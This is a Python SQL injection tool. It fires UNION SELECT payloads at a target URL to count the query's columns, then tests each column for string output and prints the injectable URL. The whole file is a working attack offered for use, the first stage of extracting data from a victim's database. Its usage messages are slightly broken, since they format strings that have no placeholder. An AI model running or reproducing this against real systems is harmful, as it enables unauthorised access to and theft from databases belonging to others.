import sys
import re
import requests
import urllib.parse

def searchColumnNumber(target_url,column_number):  
    col_num = -1

    print ("[+] Determining the number of columns")
    for x in range(0,column_number):
        target_inj = "' UNION SELECT NULL" + (x * ",NULL") + "--"
        target_inj_encoded = urllib.parse.quote_plus(target_inj)
        target = target_url + target_inj_encoded
        response = requests.get(target)
        if response.status_code == 200:
            col_num = x
            break
    return col_num                    

def usefulDataType(target_url, num):
    num = num + 1
    col_array = []
    string = "'jozDCh'"
    
    print("[+] Injecting string %s" %(string))
    for x in range(0, num):
        #buliding array according to results from searchColumnNumber
        col_array.append("NULL")

    for y in range (0,num):
        col_array[y] = string
        col_array_str = col_array[0]

        for z in range(1,len(col_array)):    
            col_array_str += ','+ str(col_array[z]) 

        target_inj = "' UNION SELECT " + col_array_str  + "--"
        target_inj_encoded = urllib.parse.quote_plus(target_inj)
        target = target_url + target_inj_encoded
        try:
            response = requests.get(target)

            if response.status_code == 200:
                print("[+] Injection could be done in column %s" %(y+1))
                print("[+] String: " + target)

            col_array[y] = "NULL"
        except:
            print("[-] Server is not responding")


def main():
    if len(sys.argv) != 3:
        print ("[+] usage: <target> <number of columns to test>" % sys.argv[0])
        print ("[+] eg: https://192.168.1.100/?id=1 10" %sys.argv[0])
    target_url = sys.argv[1]
    column_number = int(sys.argv[2])
    num = searchColumnNumber(target_url,column_number)
    if num == -1:
        print("[-] Failed to determine number of columns")
    else:
        usefulDataType(target_url,num)

if __name__ == "__main__":
    main()
